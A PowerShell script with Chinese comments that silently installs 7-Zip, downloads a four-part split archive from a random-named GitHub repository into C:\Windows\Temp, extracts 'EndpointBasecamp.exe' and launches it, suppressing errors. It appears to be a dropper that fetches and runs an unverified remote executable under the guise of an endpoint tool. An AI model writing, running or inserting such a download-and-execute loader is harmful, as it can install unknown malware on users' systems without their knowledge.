# 設定發生錯誤時立即停止腳本
$ErrorActionPreference = "Stop"

# 7-Zip 下載網址（可自行替換為官方最新版本）
$sevenZipDownloadUrl = "https://www.7-zip.org/a/7z2301-x64.exe"
# 7-Zip 安裝後主程式路徑
$sevenZipInstallPath = "C:\Program Files\7-Zip\7z.exe"

# 檢查 7-Zip，如未安裝則下載並靜默安裝
if (-not (Test-Path $sevenZipInstallPath)) {
    $tempInstaller = Join-Path $env:TEMP "7zInstaller.exe"
    Invoke-WebRequest -Uri $sevenZipDownloadUrl -OutFile $tempInstaller
    
    try {
        # 靜默安裝
        $null = Start-Process -FilePath $tempInstaller -ArgumentList "/S" -NoNewWindow -Wait
        if (-not (Test-Path $sevenZipInstallPath)) {
            throw "7-Zip installation failed."
        }
    } catch {
        exit 1
    } finally {
        # 移除下載的安裝檔
        Remove-Item -Path $tempInstaller -Force -ErrorAction SilentlyContinue
    }
}

# 檔案來源與下載目錄
$downloadBaseUrl = "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main"
$fileParts = @(
    "EndpointBasecamp.zip.001",
    "EndpointBasecamp.zip.002",
    "EndpointBasecamp.zip.003",
    "EndpointBasecamp.zip.004"
)
$downloadDir = "C:\Windows\Temp"

# 確保下載目錄存在
if (-not (Test-Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir | Out-Null
}

# 依序下載每個壓縮檔片段（若不存在才下載）
foreach ($filePart in $fileParts) {
    $fileUrl = "$downloadBaseUrl/$filePart"
    $destinationPath = Join-Path -Path $downloadDir -ChildPath $filePart

    if (-not (Test-Path $destinationPath)) {
        Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
    }
}

# 建立解壓縮目的目錄
$extractDir = Join-Path -Path $downloadDir -ChildPath "Extracted"
if (-not (Test-Path $extractDir)) {
    New-Item -ItemType Directory -Path $extractDir | Out-Null
}

# 組合 7-Zip 解壓縮參數 (解壓到 $extractDir，不詢問 -y)
$sevenZipArgs = "x `"$downloadDir\EndpointBasecamp.zip.001`" -o`"$extractDir`" -y"

# 執行解壓縮
try {
    $process = Start-Process -FilePath $sevenZipInstallPath -ArgumentList $sevenZipArgs -NoNewWindow -Wait -PassThru
    if ($process.ExitCode -ne 0) {
        throw "Extraction process returned exit code $($process.ExitCode)."
    }
    $extractedFile = Join-Path -Path $extractDir -ChildPath "EndpointBasecamp.exe"
    if (-not (Test-Path $extractedFile)) {
        throw "Extraction failed. File not found."
    }
} catch {
    exit 1
}

# 執行解壓縮後的程式
try {
    Start-Process -FilePath $extractedFile -NoNewWindow
} catch {
    exit 1
}
